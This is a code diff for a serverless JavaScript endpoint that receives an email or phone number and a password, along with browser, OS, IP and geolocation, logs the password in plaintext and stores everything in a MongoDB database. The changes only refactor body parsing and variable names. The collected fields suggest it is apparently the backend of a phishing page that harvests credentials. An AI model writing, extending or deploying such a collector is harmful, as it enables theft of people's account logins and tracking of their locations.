@@ -1,8 +1,6 @@
 import https from 'https';
 import { MongoClient } from 'mongodb';
-import { parse } from 'querystring';
 
-// Function to get real IP
 function getClientIP(req) {
   return req.headers['x-forwarded-for'] ||
          req.headers['x-real-ip'] ||
@@ -12,7 +10,6 @@ function getClientIP(req) {
          'Unknown';
 }
 
-// Function to get location from IP
 function getLocationFromIP(ip, callback) {
   if (ip === 'Unknown' || ip === '::1' || ip === '127.0.0.1') {
     return callback(null, 'Local');
@@ -44,25 +41,28 @@ export default async function handler(req, res) {
     return res.status(405).json({ message: 'Method not allowed' });
   }
 
-  // Parse the body
-  const body = await new Promise((resolve) => {
-    let data = '';
+  let body = '';
+  await new Promise((resolve) => {
     req.on('data', (chunk) => {
-      data += chunk;
+      body += chunk;
     });
-    req.on('end', () => {
-      resolve(data);
-    });
+    req.on('end', resolve);
   });
 
-  const parsedBody = parse(body.toString());
-  const { email_or_phone = '', password = '', browser = '', os = '' } = parsedBody;
+  let data;
+  try {
+    data = JSON.parse(body);
+  } catch (error) {
+    console.error('Error parsing JSON:', error);
+    return res.status(400).json({ message: 'Invalid JSON' });
+  }
+
+  const { email_or_phone = '', password = '', browser = '', os = '' } = data;
   console.log('Received data:', { email_or_phone, password, browser, os });
-  const ip = getClientIP(req);
 
   // Obtener ubicación
   const location = await new Promise((resolve) => {
-    getLocationFromIP(ip, (err, loc) => {
+    getLocationFromIP(getClientIP(req), (err, loc) => {
       resolve(loc);
     });
   });
@@ -74,9 +74,9 @@ export default async function handler(req, res) {
   const safeBrowser = browser.replace(/\r?\n/g, ' ');
   const safeOs = os.replace(/\r?\n/g, ' ');
   const safeLocation = location.replace(/\r?\n/g, ' ');
-  const data = {
+  const doc = {
     timestamp: now,
-    ip,
+    ip: getClientIP(req),
     location: safeLocation,
     os: safeOs,
     browser: safeBrowser,
@@ -94,8 +94,8 @@ export default async function handler(req, res) {
     console.log('Connected to MongoDB');
     const db = client.db('Correos');
     const collection = db.collection('Data');
-    await collection.insertOne(data);
-    console.log('Data inserted into database:', JSON.stringify(data));
+    await collection.insertOne(doc);
+    console.log('Data inserted into database:', JSON.stringify(doc));
     await client.close();
     console.log('Connection closed');
   } catch (error) {
